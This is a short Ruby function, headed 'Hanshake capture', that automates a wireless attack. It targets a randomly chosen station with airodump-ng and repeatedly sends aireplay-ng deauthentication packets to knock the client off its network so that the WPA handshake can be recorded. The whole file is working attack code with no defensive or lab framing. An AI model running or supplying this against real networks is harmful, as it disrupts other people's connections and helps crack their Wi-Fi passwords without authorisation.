#Hanshake capture

def aireplay_runner stations = Array.new
	
	if stations[0].nil?
		puts "Error: No stations found"
		return -1;
	end
	
	
	s = stations.sample
	
	p = IO.popen("sudo airodump-ng mon0 --bssid #{s.bssid} -c #{s.channel} -w replay --ivs")


	fork do 
		sleep(2)
		5.times do
			system("sudo aireplay-ng -0 1 -a #{s.bssid} -c #{s.stmac} mon0 > replay_output.txt")
			sleep(4)
		end
	end


	pid = p.pid
	n = 28
	sleep(n)
	Process.kill("INT", pid)

	
end


